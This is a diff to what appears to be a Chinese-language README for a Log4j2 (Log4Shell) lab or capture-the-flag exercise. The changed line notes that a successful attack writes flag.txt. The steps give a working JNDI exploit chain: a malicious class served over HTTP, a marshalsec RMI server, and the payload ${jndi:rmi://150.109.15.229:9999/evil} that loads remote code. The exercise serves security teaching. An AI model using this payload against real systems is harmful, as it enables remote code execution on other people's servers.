@@ -74,7 +74,7 @@
 
 2、将 evilcalc.class 放到任意http服务器上(如：python3 -m http.server 8088)
 3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evil" 9999）
-4、发送payload请求到Log4j2漏洞接口：${jndi:rmi://150.109.15.229:9999/evil}
+4、发送payload请求到Log4j2漏洞接口：${jndi:rmi://150.109.15.229:9999/evil}，调用成功后，会在/app目录下生成flag.txt文件
 
 注意：需要在项目中配置启用 RMI 协议支持从远程服务器加载 Java 对象：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 
